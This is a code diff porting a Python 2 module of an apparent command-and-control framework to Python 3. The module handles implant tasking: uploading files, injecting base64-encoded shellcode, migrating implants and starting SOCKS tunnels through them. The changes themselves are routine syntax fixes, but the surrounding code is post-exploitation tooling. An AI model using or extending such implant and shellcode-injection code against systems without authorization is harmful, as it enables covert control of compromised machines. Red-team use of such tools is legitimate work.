@@ -1,4 +1,4 @@
-import base64, re, traceback, os, readline
+import base64, re, traceback, os, readline, string
 from Alias import cs_alias, cs_replace
 from Colours import Colours
 from Utils import randomuri, validate_sleep_time
@@ -29,8 +29,7 @@ def handle_sharp_command(command, user, randomuri, startup):
 
     if "searchhelp" in command.lower():
         searchterm = (command.lower()).replace("searchhelp ","")
-        import string
-        helpful = string.split(sharp_help1, '\n')
+        helpful = sharp_help1.split('\n')
         for line in helpful:
           if searchterm in line.lower():
             print (line)
@@ -44,7 +43,7 @@ def handle_sharp_command(command, user, randomuri, startup):
           while not os.path.isfile(source):
             print("File does not exist: %s" % source)
             source = readfile_with_completion("Location of file to upload: ")
-          destination = raw_input("Location to upload to: ")
+          destination = input("Location to upload to: ")
         else:
           args = argp(command)
           source = args.source
@@ -53,7 +52,7 @@ def handle_sharp_command(command, user, randomuri, startup):
           with open(source, "rb") as source_file:
             s = source_file.read()
           if s:
-            sourceb64 = base64.b64encode(s)
+            sourceb64 = base64.b64encode(s).decode("utf-8")
             destination = destination.replace("\\","\\\\")
             print ("")
             print ("Uploading %s to %s" % (source, destination))
@@ -82,7 +81,7 @@ def handle_sharp_command(command, user, randomuri, startup):
         try:
           shellcodefile = load_file(path)
           if shellcodefile != None:
-            new_task("run-exe Core.Program Core Inject-Shellcode %s%s #%s" % (base64.b64encode(shellcodefile),params, os.path.basename(path)), user, randomuri)
+            new_task("run-exe Core.Program Core Inject-Shellcode %s%s #%s" % (base64.b64encode(shellcodefile).decode("utf-8"),params, os.path.basename(path)), user, randomuri)
         except Exception as e:
           print ("Error loading file: %s" % e)
 
@@ -93,7 +92,7 @@ def handle_sharp_command(command, user, randomuri, startup):
 
     elif "kill-implant" in command.lower() or "exit" in command.lower():
         impid = get_implantdetails(randomuri)
-        ri = raw_input("Are you sure you want to terminate the implant ID %s? (Y/n) " % impid[0])
+        ri = input("Are you sure you want to terminate the implant ID %s? (Y/n) " % impid[0])
         if ri.lower() == "n":
           print ("Implant not terminated")
         if ri == "":
@@ -108,12 +107,12 @@ def handle_sharp_command(command, user, randomuri, startup):
       from random import choice
       allchar = string.ascii_letters
       channel = "".join(choice(allchar) for x in range(25))
-      sharpkey = gen_key()
+      sharpkey = gen_key().decode("utf-8")
       sharpurls = get_sharpurls()
       sharpurls = sharpurls.split(",")
       sharpurl = select_item("HostnameIP", "C2Server")
       print (POSHDIR+"SharpSocks/SharpSocksServerCore -c=%s -k=%s --verbose -l=%s\r\n" % (channel,sharpkey,SocksHost)+Colours.GREEN)
-      ri = raw_input("Are you ready to start the SharpSocks in the implant? (Y/n) ")
+      ri = input("Are you ready to start the SharpSocks in the implant? (Y/n) ")
       if ri.lower() == "n":
         print("")        
       if ri == "":
@@ -258,13 +257,11 @@ def migrate(randomuri, user, params=""):
     path = "%spayloads/Sharp_v4_x%s_Shellcode.bin" % (ROOTDIR,arch)
     shellcodefile = load_file(path)
   elif "Daisy" in implant_comms:
-    daisyname = raw_input("Name required: ")
+    daisyname = input("Name required: ")
     path = "%spayloads/%sSharp_v4_x%s_Shellcode.bin" % (ROOTDIR,daisyname,arch)
     shellcodefile = load_file(path)
   elif "Proxy" in implant_comms:
     path = "%spayloads/ProxySharp_v4_x%s_Shellcode.bin" % (ROOTDIR,arch)
     shellcodefile = load_file(path)
 
-  new_task("run-exe Core.Program Core Inject-Shellcode %s%s #%s" % (base64.b64encode(shellcodefile),params, os.path.basename(path)), user, randomuri)
-  new_task("$Shellcode%s=\"%s\" #%s" % (arch,base64.b64encode(shellcodefile), os.path.basename(path)), user, randomuri)
-  new_task("Inject-Shellcode -Shellcode ([System.Convert]::FromBase64String($Shellcode%s))%s" % (arch, params), user, randomuri)
+  new_task("run-exe Core.Program Core Inject-Shellcode %s%s #%s" % (base64.b64encode(shellcodefile).decode("utf-8"),params, os.path.basename(path)), user, randomuri)
